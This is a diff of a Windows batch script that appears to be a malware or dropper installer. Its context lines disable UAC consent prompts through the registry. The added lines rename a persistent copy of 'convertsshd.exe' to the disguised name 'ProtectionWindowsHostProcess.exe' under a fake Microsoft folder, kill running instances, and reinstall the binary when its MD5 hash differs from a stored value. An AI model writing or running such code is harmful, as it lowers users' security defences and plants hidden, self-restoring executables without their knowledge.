@@ -16,7 +16,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f
 
 
-
+set "RUNEVERYOFFICIALMD5=ce74138574a515e7787d6ec7f785f6e1"
 
 
 
@@ -124,7 +124,7 @@ if not exist "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks" mkdir "%
 
 :: Define the paths
 set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
-set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
 
 :: Check if the file exists in the Startup folder
 if not exist "%startupFile%" (
@@ -133,6 +133,38 @@ if not exist "%startupFile%" (
 ) else (
     echo File is already in Startup folder.
 )
+
+
+taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+
+
+
+
+for /f "tokens=*" %%A in ('certutil -hashfile "%SystemRoot%\System32\convertsshd.exe" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
+echo MD5 of %SystemRoot%\System32\convertsshd.exe = %RUNEVERYCURRENTMD5%
+echo.
+echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5%
+echo.
+
+if "%RUNEVERYCURRENTMD5%"=="%RUNEVERYOFFICIALMD5%" (
+    echo MD5 matches %RUNEVERYCURRENTMD5% = %RUNEVERYOFFICIALMD5%
+    echo.
+) else (
+    echo MD5 doesnt match %RUNEVERYCURRENTMD5% # %RUNEVERYOFFICIALMD5%
+    echo Going to INSTRUNEVERY
+    goto INSTRUNEVERY
+)
+
+
+echo.
+echo.
+
+
 
 
 if not exist "%startupFile%" goto INSTRUNEVERY
